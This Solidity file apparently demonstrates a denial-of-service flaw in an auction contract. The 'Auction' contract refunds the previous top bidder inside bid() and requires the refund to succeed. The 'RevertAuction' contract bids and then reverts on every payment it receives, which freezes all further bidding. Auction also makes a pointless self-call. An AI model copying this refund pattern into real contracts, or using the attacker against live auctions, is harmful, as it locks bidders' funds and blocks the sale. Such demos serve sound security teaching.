// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Auction {
    uint256 public topBid;
    address public topBidder;

    constructor() payable {
        topBid = msg.value;
        topBidder = msg.sender;
    }

    function bid() public payable {
        require(msg.value > topBid, "Your bid need exceed top bid balance");

        (bool status, ) = topBidder.call{value: topBid}("");
        require(status == true, "send ETH faild");

        (bool send, ) = address(this).call{value: msg.value}("");
        require(send == true, "send ETH faild");
        topBid = msg.value;
        topBidder = msg.sender;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    receive() payable external {}
    fallback() payable external {}
}

contract RevertAuction {

    function attackBid(address _addr) public payable returns (bool) {
        (bool call, ) = _addr.call{value: 10 ether}(abi.encodeWithSignature("bid()", ""));
        return call;
    }

    function ownedETH() public view returns (uint256) {
        return address(this).balance;
    }

    fallback() external {
        revert();
    }
}